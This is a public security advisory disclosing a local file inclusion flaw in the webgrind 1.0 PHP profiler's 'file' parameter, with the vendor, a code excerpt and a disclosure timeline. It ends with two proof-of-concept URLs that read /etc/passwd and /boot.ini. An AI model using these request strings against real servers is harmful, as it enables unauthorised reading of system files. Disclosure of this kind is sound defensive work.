@@ -1,0 +1,56 @@
+webgrind 1.0 (file param) Local File Inclusion Vulnerability
+
+
+Vendor: Joakim Nygard and Jacob Oettinger
+Product web page: http://code.google.com/p/webgrind
+Affected version: 1.0 (v1.02 in trunk on github)
+
+Summary: Webgrind is an Xdebug profiling web frontend in PHP5.
+
+Desc: webgrind suffers from a file inlcusion vulnerability (LFI)
+when input passed thru the 'file' parameter to index.php is not
+properly verified before being used to include files. This can be
+exploited to include files from local resources with directory
+traversal attacks and URL encoded NULL bytes.
+
+----------------------------------------
+/index.php:
+-----------
+
+122: case 'fileviewer':
+123:     $file = get('file');
+124:     $line = get('line');
+
+----------------------------------------
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           PHP 5.3.9
+           MySQL 5.5.20
+
+
+Vulnerability discovered by Michael Meyer
+                            michael.meyer greenbone net
+
+
+Vendor status:
+
+[22.02.2012] Vulnerability discovered.
+[22.02.2012] Vendor notified.
+[24.02.2012] No response from the vendor.
+[25.02.2012] Public security advisory released.
+
+
+Advisory ID: ZSL-2012-5075
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5075.php
+
+Vendor: http://code.google.com/p/webgrind/issues/detail?id=66
+
+
+22.02.2012
+
+---
+
+
+ http://<host>/webgrind/index.php?file=/etc/passwd&op=fileviewer
+ http://<host>/webgrind/index.php?file=/boot.ini&op=fileviewer
